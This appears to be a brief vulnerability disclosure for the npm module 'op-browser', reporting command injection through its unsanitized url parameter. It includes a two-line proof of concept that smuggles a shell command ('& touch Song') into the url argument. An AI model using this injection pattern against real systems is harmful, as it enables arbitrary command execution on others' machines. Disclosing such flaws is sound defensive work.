# Overview

`op-browser` is a module that open browser window and set proxy, this package are vulnerable to Command Injection.

The `url` parameter can be controlled by users without any sanitization.

# Proof of Concept

```
var root = require("op-browser");
root.open('chrome','& touch Song','','');
```
